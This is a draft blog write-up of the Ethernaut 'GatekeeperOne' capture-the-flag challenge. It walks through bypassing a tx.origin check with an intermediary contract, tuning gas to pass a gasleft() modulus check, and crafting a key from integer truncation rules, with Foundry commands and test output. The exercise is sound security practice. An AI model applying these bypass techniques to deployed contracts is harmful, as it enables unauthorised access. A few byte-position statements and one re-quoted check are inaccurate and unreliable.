###########################
Ethernaut 12: GatekeeperOne
###########################
:date: 2023-07-31
:slug: ethernaut-12-GatekeeperOne
:summary: This'd be easier with some more revert messages 🙃
:status: draft
:tags: 
:author: capu
:featured_image:


Objective
=========
Get past the three gatekeepers and register as the ``entrant``.

Code
====
.. code-block:: solidity
    :linenos: inline

    contract GatekeeperOne {
        address public entrant;

        modifier gateOne() {
            require(msg.sender != tx.origin);
            _;
        }

        modifier gateTwo() {
            require(gasleft() % 8191 == 0);
            _;
        }

        modifier gateThree(bytes8 _gateKey) {
            require(
                uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
                "GatekeeperOne: invalid gateThree part one"
            );
            require(
                uint32(uint64(_gateKey)) != uint64(_gateKey),
                "GatekeeperOne: invalid gateThree part two"
            );
            require(
                uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
                "GatekeeperOne: invalid gateThree part three"
            );
            _;
        }

        function enter(bytes8 _gateKey)
            public
            gateOne
            gateTwo
            gateThree(_gateKey)
        returns (bool) {
            entrant = tx.origin;
            return true;
        }
    }

Solution
========

gateOne
-------

.. code-block:: solidity

    tx.origin != msg.sender

This is simiar to the Telephone challenge, just calling from a contract gets us
through the gate.

gate two
--------

.. code-block:: solidity

    require(gasleft() % 8191 == 0);

the amount of gas remaining when reaching that point should be a multiple of
``8191``. Sending ``8191`` gas would fail for two reasons:

- some gas is spent before reaching the point where the ``gasleft`` opcode is
  executed, so I have to account for that.
- After all the gates are passed, the ``entrant`` variable is written to
  storage, and that's surely more expensive than ``8191`` gas, so I'd have to
  send a multiple to avoid an out of gas error.

The latter is a write to a cold, uninitialized storage slot with a
non-zero value. I should use a multiple:

.. code-block:: text

    22100/8191
    2.69808326211695763643

so, at least...

.. code-block:: text

    8191*3
    24573

Regarding the former: the gasleft() call is not the first action in the call.
And even if it was in source code, the internal transaction would still have
consumed some gas decoding enough of the calldata to know which function
implementation to jump to.

So I have to figure out how much gas is spent up to that point.
Thankfully foundry can help with that:

.. code-block:: fish

    [N]> forge test --mc GatekeeperOne --debug testSolution

and jumped to the point in the code where the ``GAS`` opcode is called. sourcemaps
are broken somehow, so I had to log the address of the target contract and
scroll until the gas opcode. The gas used until that point (and including the
``GAS`` opcode itself) is 416. So the gas to send is: 

.. code-block:: text

    24573 + 416
    24989

.. note::

    using gas like this is very fragile because the gas costs of opcodes change
    between EVM hardforks. When updating the solutions repo to the last hard
    fork (shanghai), the gas costs of described in the last paragraph changed,
    so I had to update the solution to send 148 more gas.

gate three part one
-------------------

From the contract: 

.. code-block:: solidity

    uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))

A reminder that the EVM is big-endian. And this means (from wikipedia):

    A big-endian system stores the most significant byte of a word at the smallest
    memory address and the least significant byte at the largest

Also, from `explicit type conversions in the solidity docs
<https://docs.soliditylang.org/en/v0.8.19/types.html#conversions-between-elementary-types>`_ :

    If an integer is explicitly converted to a smaller type, higher-order bits are
    cut off

Interactively, in chisel:

.. code-block:: solidity

    [I] capu ~/s/ethernaut-solutions (master)> chisel
    ➜ bytes8 key = 0x0011223344556677;
    ➜ uint64(key)
    ├ Hex: 0x11223344556677
    ➜ uint16(uint64(key))
    ├ Hex: 0x6677
    ➜ uint32(uint64(key))
    ├ Hex: 0x44556677

so for the first check, I want the memory contents of the last two bytes and
the last four bytes to evaluate to the same number. So bytes 6,7 can be
whatever, but 4,5 must be zero. A zero calldata will do:

.. code-block:: solidity

    target.enter{gas: 24989}(0x0000000000000000);

gate three part two
-------------------

.. code-block:: solidity

    uint32(uint64(_gateKey)) != uint64(_gateKey)

in chisel:

.. code-block:: solidity

    ➜ bytes8 key = 0x0011223344556677;
    ➜ uint64(key)
    ├ Hex: 0x11223344556677
    ➜ uint32(uint64(key))
    ├ Hex: 0x44556677

all of the bytes in the key, interpreted as an uint, should have a value
different than bytes 4,5,6,7. So any bit of the remaining bytes should be non-zero.

So far, the interesection of all conditions is:

- bytes 4,5 must be zero
- bytes 0,1,2,3 must have at least one bit be 1

let's try:

.. code-block:: solidity

    target.enter{gas: 24989}(0x0100000000000000);

and run it:

.. code-block:: fish

    [N] capu ~/s/ethernaut-solutions (master) [1]> forge test --mc GatekeeperOne -vv
    ...
    [FAIL. Reason: GatekeeperOne: invalid gateThree part three] testSolution() (gas: 1067270)
    ...

Yey! Progress! Let's get onto part three

gate three part three
---------------------

.. code-block:: solidity

    require(
        uint32(uint64(_gateKey)) == uint160(tx.origin),
        "GatekeeperOne: invalid gateThree part three"
    );

... this means bytes 6,7 of the key should be the same as bytes 30,31 of tx.origin

Wrapping up, conditions on ``_gateKey``:

1. bytes 4,5 must be zero
2. bytes 0,1,2,3 must be non-zero
3. bytes 6,7 should be the same as tx.origin's bytes 30,31

If there also were a condition on bytes 6,7 to be zero (or something specific),
then I'd have to compute a vanity address. But in this case, it's enough to set
the key to the same value whatever address we're using has:

   .. code-block:: solidity

    // I know the address being pranked is
    // 0x0000000000000000000000000000000000000539
    (new Caller()).enter(target, 0x0100000000000539);


.. code-block:: fish

    [N] capu ~/s/ethernaut-solutions (master) [1]> forge test --mc GatekeeperOne
    Running 1 test for test/13-GatekeeperOne.t.sol:GatekeeperOneSolution
    [PASS] testSolution() (gas: 2064881)
    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 837.73µs
    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

😎
